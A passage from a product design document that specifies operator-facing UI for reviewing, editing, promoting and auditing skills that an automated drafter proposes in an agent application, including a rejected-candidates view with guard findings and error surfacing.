Add `'skills'` to `missionDashboardTab` union in `src/renderer/state/store.ts:260`. The tab has three sub-panels:

**(a) Active skills list**
- Sortable table: name | V score | load count (last 30) | last loaded | confidence | status
- V score color-coded: green ≥+1.0, yellow -0.5..+1.0, red <-0.5
- Click row → opens detail drawer with SKILL.md body, last 10 outcome events (category + evidence + timestamp), trigger list, tags
- Actions: "open in editor" (opens skills_root/name/SKILL.md in OS default), "force re-classify" (debug)
- Data source: store.skills Record + new IPC `getSkillValueRollup(name)` that calls `value_score.compute_rollup`

**(b) Pending candidates queue**
- Same data as current `skillCandidateQueue` but as a table view (not a single toast)
- Columns: name | description | guardVerdict (caution=yellow badge) | drafted at | source session
- Per-row buttons: Edit | Promote | Discard | Defer (move to back)
- Edit opens an inline form for name/description/body (3 textareas) with a "Promote with edits" submit — back end already supports this via `confirmation._apply_edits`, only the UI is missing
- Caution-verdict rows have a yellow border + the `guardSummary` text expanded by default

**(c) Rejected candidates / negative library**
- New IPC handler `listRejectedCandidates(limit=50)` that reads `~/.freyja/skills/.rejected/*.yaml` sorted by mtime
- Table: name | reason (skills_guard_dangerous / operator_discard / ...) | actor (guard / operator / auto) | rejected at
- Click row → drawer shows the rejected body + the guard findings (line numbers + severity + reasoning)
- "Why this matters": this is the operator's window into what the drafter tried and was prevented from doing — the audit trail the design promises

### UI-2. Drafter activity strip (header or sidebar)
- Compact strip showing: "Drafter: last ran 4 turns ago · next cadence in 6 turns · last decision: skip ('would patch pdf-parser')"
- Data sources: cadence counter state (new IPC `getCadenceState`); EVENT_DRAFTER_SKIP events (after H10 lands)
- Without this, operators can't distinguish "loop is operating but conservative" from "loop is broken." This is the explicit design goal of the cadence engine + drafter pair.

### UI-3. Edit form for candidates (subset of UI-1.b, called out)
- Currently SkillToast has only Promote/Discard. The back-end edit path (`edits: {name?, description?, body?}`) is fully wired. Minimum viable surface: inline name+description editing in the toast itself (body can stay read-only for v1 since it's the big one). Adds a "promote with edits" button that calls `resolve(candidate.candidateId, 'promote', {name, description})`.
- Without this, operators hitting a candidate with a bad name (drafter chose `parse_pdfs`, operator wants `pdf-parser`) must discard and hope for re-proposal.

### UI-4. Caution-verdict differentiation in toast + Slack card
- Currently caution and safe render identically. Subsumed by M9 but listed here because it's a UX gap, not just a code gap.
- Toast: yellow border, "REVIEW" badge next to name, `guardSummary` text shown without needing to expand.
- Slack: yellow `:warning:` emoji, `guardSummary` as the first body line above the bodyPreview code block.

### UI-5. Surface drafter+watcher errors to the operator
- Today, provider 404s, classifier errors, and write failures are caught in try/except and logged. The operator has zero visibility.
- Add a "Skill learning errors" section to the Skills tab (last 10 errors with timestamp + brief reason). Acts as a smoke test for "is the loop actually running."

---

**Implementation order recommendation:** Land all 8 criticals together (they collectively cause "MVP loop is dead end-to-end"); HIGH bucket can ship in 2-3 PRs grouped by area (drafter, lifecycle, value_score); UI-1 (the Skills tab) is the next-biggest user-visible delta and should be its own PR.